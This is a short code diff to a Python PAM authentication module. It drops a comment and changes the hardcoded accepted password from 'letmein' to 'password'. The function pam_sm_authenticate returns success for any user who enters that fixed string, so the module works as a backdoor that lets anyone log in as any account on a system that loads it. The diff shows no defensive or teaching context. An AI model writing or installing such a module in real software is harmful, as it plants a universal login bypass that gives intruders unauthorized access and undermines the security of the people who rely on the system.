@@ -1,4 +1,3 @@
-# Program that allows users to login to the system if the password is "password"
 def get_user(pamh):
     try:
         return pamh.get_user(None)
@@ -12,7 +11,7 @@ def pam_sm_authenticate(pamh, flags, argv):
 
     try:
         resp = pamh.conversation(pamh.Message(pamh.PAM_PROMPT_ECHO_OFF, "Password:"))
-        if resp.resp == "letmein":
+        if resp.resp == "password":
             return pamh.PAM_SUCCESS
         else:
             return pamh.PAM_AUTH_ERR
